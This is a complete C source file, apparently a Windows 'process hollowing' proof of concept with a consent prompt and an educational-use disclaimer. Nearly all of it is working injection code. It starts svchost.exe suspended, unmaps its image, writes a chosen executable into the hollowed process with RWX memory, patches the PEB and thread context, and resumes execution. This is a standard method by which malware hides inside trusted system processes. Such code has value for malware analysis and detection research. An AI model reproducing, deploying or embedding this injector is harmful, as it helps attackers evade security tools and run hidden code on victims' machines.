#include <windows.h>
#include <commdlg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// ntunmapviewofsection typedef
typedef LONG(NTAPI* pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

// file picker for selecting the exe
BOOL SelectPayloadFile(wchar_t* outPath, DWORD maxLen) {
    OPENFILENAMEW ofn;
    ZeroMemory(&ofn, sizeof(ofn));
    ZeroMemory(outPath, maxLen * sizeof(wchar_t));

    ofn.lStructSize  = sizeof(ofn);
    ofn.hwndOwner    = NULL;
    ofn.lpstrFile    = outPath;
    ofn.nMaxFile     = maxLen;
    ofn.lpstrFilter  = L"Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
    ofn.lpstrTitle   = L"Select the PE (.exe) file to inject";
    ofn.Flags        = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_NOCHANGEDIR;

    return GetOpenFileNameW(&ofn);
}

// prints the consent screen and asks yes/no
BOOL AskUserConsent(void) {
    char answer[64];

    printf("============================================================\n");
    printf("  PROCESS HOLLOWING - Proof of Concept (PoC)\n");
    printf("============================================================\n");
    printf("\n");
    printf("  This tool demonstrates the 'Process Hollowing' technique\n");
    printf("  for EDUCATIONAL and RESEARCH purposes only.\n");
    printf("\n");
    printf("  What will happen:\n");
    printf("    1. A legitimate Windows process (svchost.exe) will be\n");
    printf("       created in a SUSPENDED state.\n");
    printf("    2. Its memory image will be unmapped.\n");
    printf("    3. The PE file you select will be injected into its\n");
    printf("       address space.\n");
    printf("    4. The thread will be resumed to execute the injected code.\n");
    printf("\n");
    printf("  WARNING: Only use this on systems you own or have explicit\n");
    printf("  permission to test. Misuse may violate laws.\n");
    printf("============================================================\n");
    printf("\n");
    printf("  Do you want to proceed? (yes/no): ");

    if (!fgets(answer, sizeof(answer), stdin)) return FALSE;

    // trim leading whitespace
    char* start = answer;
    while (*start == ' ' || *start == '\t') start++;

    // trim trailing whitespace and newlines
    char* end = start + strlen(start) - 1;
    while (end > start && (*end == '\n' || *end == '\r' || *end == ' ' || *end == '\t')) {
        *end = '\0';
        end--;
    }

    // convert to lowercase
    for (char* p = start; *p; p++) *p = (char)tolower((unsigned char)*p);

    return (strcmp(start, "yes") == 0 || strcmp(start, "y") == 0);
}

// reads the whole file into a heap buffer
BYTE* ReadFileToMemory(const wchar_t* path, DWORD* outSize) {
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "  [!] Failed to open file. Error: %lu\n", GetLastError());
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        fprintf(stderr, "  [!] Failed to get file size.\n");
        CloseHandle(hFile);
        return NULL;
    }

    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        fprintf(stderr, "  [!] Memory allocation failed.\n");
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        fprintf(stderr, "  [!] Failed to read file.\n");
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *outSize = fileSize;
    return buffer;
}

// spawns svchost.exe in suspended state
BOOL CreateSuspendedProc(const wchar_t* targetExe, PROCESS_INFORMATION* pi) {
    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(pi, sizeof(*pi));

    if (!CreateProcessW(targetExe, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, pi)) {
        fprintf(stderr, "  [!] CreateProcessW failed. Error: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

// reads peb, gets image base, then unmaps it
BOOL UnmapProcessImage(PROCESS_INFORMATION* pi, DWORD64* pebAddress, DWORD64* imageBase) {
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi->hThread, &ctx)) {
        fprintf(stderr, "  [!] GetThreadContext failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // rdx points to peb on process start
    *pebAddress = ctx.Rdx;

    // imagebaseaddress is at peb + 0x10
    DWORD64 imgBase = 0;
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(pi->hProcess, (LPCVOID)(*pebAddress + 0x10),
                           &imgBase, sizeof(imgBase), &bytesRead)) {
        fprintf(stderr, "  [!] ReadProcessMemory failed. Error: %lu\n", GetLastError());
        return FALSE;
    }
    *imageBase = imgBase;

    // get ntunmapviewofsection from ntdll at runtime
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        fprintf(stderr, "  [!] Failed to get ntdll handle.\n");
        return FALSE;
    }

    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        fprintf(stderr, "  [!] Failed to resolve NtUnmapViewOfSection.\n");
        return FALSE;
    }

    LONG status = NtUnmapViewOfSection(pi->hProcess, (PVOID)imgBase);
    if (status != 0) {
        fprintf(stderr, "  [!] NtUnmapViewOfSection failed. NTSTATUS: 0x%08lX\n", (DWORD)status);
        return FALSE;
    }

    return TRUE;
}

// parses the pe and writes it into the target process
BOOL InjectPayload(PROCESS_INFORMATION* pi, const BYTE* data, DWORD dataSize,
                   DWORD64 imageBase, DWORD64* remoteBase, DWORD* entryPointRVA) {
    // e_lfanew is at offset 0x3c in the dos header
    DWORD e_lfanew = *(DWORD*)(data + 0x3C);
    DWORD optHeaderOffset = e_lfanew + 24;

    // grab what we need from the optional header
    *entryPointRVA      = *(DWORD*)(data + optHeaderOffset + 16);
    DWORD sizeOfImage   = *(DWORD*)(data + optHeaderOffset + 56);
    DWORD sizeOfHeaders = *(DWORD*)(data + optHeaderOffset + 60);

    // allocate space in target process at the old image base
    LPVOID allocBase = VirtualAllocEx(pi->hProcess, (LPVOID)imageBase, sizeOfImage,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocBase) {
        fprintf(stderr, "  [!] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        return FALSE;
    }
    *remoteBase = (DWORD64)allocBase;

    // write pe headers first
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi->hProcess, allocBase, data, sizeOfHeaders, &bytesWritten)) {
        fprintf(stderr, "  [!] WriteProcessMemory (headers) failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // write each section one by one
    WORD numSections     = *(WORD*)(data + e_lfanew + 6);
    WORD sizeOfOptHeader = *(WORD*)(data + e_lfanew + 20);
    DWORD sectionHdrOff  = e_lfanew + 24 + sizeOfOptHeader;

    for (int i = 0; i < numSections; i++) {
        DWORD shOff          = sectionHdrOff + (i * 40);
        DWORD virtualAddress = *(DWORD*)(data + shOff + 12);
        DWORD rawSize        = *(DWORD*)(data + shOff + 16);
        DWORD rawOffset      = *(DWORD*)(data + shOff + 20);

        // skip empty sections
        if (rawSize == 0) continue;

        if (!WriteProcessMemory(pi->hProcess, (LPVOID)(*remoteBase + virtualAddress),
                                data + rawOffset, rawSize, &bytesWritten)) {
            fprintf(stderr, "  [!] WriteProcessMemory (section) failed. Error: %lu\n", GetLastError());
            return FALSE;
        }
    }

    return TRUE;
}

// patches peb and redirects rcx to the new entry point
BOOL SetEntryPoint(PROCESS_INFORMATION* pi, DWORD64 pebAddress,
                   DWORD64 remoteBase, DWORD entryPointRVA) {
    // update imagebaseaddress in peb
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(pi->hProcess, (LPVOID)(pebAddress + 0x10),
                            &remoteBase, sizeof(remoteBase), &bytesWritten)) {
        fprintf(stderr, "  [!] WriteProcessMemory (PEB) failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    // get context, change rcx to point at our entry
    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi->hThread, &ctx)) {
        fprintf(stderr, "  [!] GetThreadContext failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    ctx.Rcx = remoteBase + entryPointRVA;

    if (!SetThreadContext(pi->hThread, &ctx)) {
        fprintf(stderr, "  [!] SetThreadContext failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main(void) {
    // ask for consent before doing anything
    if (!AskUserConsent()) {
        printf("\n  [!] Operation cancelled by user.\n");
        return 0;
    }

    printf("\n  [+] Consent granted. Opening file picker...\n\n");

    // let user pick the exe to inject
    wchar_t payloadPath[MAX_PATH];
    if (!SelectPayloadFile(payloadPath, MAX_PATH)) {
        printf("  [!] No file selected. Exiting.\n");
        return 0;
    }

    wprintf(L"  [+] Selected file: %s\n", payloadPath);

    // read the pe into ram
    DWORD payloadSize = 0;
    BYTE* payloadData = ReadFileToMemory(payloadPath, &payloadSize);
    if (!payloadData) return 1;

    // target host process
    const wchar_t* target = L"C:\\Windows\\System32\\svchost.exe";

    PROCESS_INFORMATION pi;
    if (!CreateSuspendedProc(target, &pi)) { free(payloadData); return 1; }

    DWORD64 pebAddress = 0, imageBase = 0;
    if (!UnmapProcessImage(&pi, &pebAddress, &imageBase)) {
        TerminateProcess(pi.hProcess, 1);
        free(payloadData);
        return 1;
    }

    DWORD64 remoteBase = 0;
    DWORD entryPointRVA = 0;
    if (!InjectPayload(&pi, payloadData, payloadSize, imageBase, &remoteBase, &entryPointRVA)) {
        TerminateProcess(pi.hProcess, 1);
        free(payloadData);
        return 1;
    }

    if (!SetEntryPoint(&pi, pebAddress, remoteBase, entryPointRVA)) {
        TerminateProcess(pi.hProcess, 1);
        free(payloadData);
        return 1;
    }

    // finally wake the thread up
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        fprintf(stderr, "  [!] ResumeThread failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        free(payloadData);
        return 1;
    }

    printf("\n  [+] Process hollowing completed successfully.\n");

    // cleanup
    free(payloadData);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}

/******************************************************************************
 * DISCLAIMER: EDUCATIONAL AND RESEARCH PURPOSES ONLY
 *
 * This Proof of Concept (PoC) code is created solely for educational,
 * academic research, and defensive purposes. The primary goal of this
 * project is to demonstrate the mechanics of the "Process Hollowing"
 * technique, enabling security researchers, malware analysts, and system
 * administrators to better understand, detect, and mitigate such threats.
 *
 * The author (@yamanist0) is not responsible for any misuse, damage, or
 * illegal activities caused by the utilization of this code or associated
 * techniques. Any attempt to use this tool on systems, networks, or endpoints
 * without explicit, mutual, and authorized consent is strictly prohibited.
 *
 * By compiling, analyzing, or modifying this code, you assume all
 * responsibility and liability for your actions.
 ******************************************************************************/